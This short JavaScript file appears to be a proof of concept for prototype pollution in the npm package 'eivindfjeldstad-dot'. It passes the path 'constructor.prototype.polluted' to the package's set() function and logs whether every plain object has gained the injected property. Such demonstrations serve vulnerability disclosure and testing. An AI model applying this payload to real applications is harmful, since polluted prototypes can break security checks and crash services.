var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const a = require('eivindfjeldstad-dot');
console.log({}.polluted);
let path = 'constructor.prototype.polluted';
a.set(obj, path, 'yes');
console.log({}.polluted);